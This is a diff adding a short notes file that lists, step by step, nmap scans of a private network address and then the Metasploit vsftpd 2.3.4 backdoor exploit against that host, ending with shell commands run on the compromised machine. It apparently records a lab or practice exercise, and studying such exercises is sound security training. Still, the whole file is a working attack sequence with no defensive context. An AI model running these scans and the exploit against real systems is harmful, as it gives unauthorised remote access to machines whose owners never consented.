@@ -1,0 +1,19 @@
+nmap -sP  192.168.29.23/24 -- to get live hosts
+
+nmap -sV -O 192.168.29.23 -- to get version of each network and OS
+
+nmap 192.168.29.23/24 -- to check all open ports
+
+msfconsole
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+show options
+
+set RHOST 192.168.29.23
+
+exploit
+
+pwd
+
+ls -l
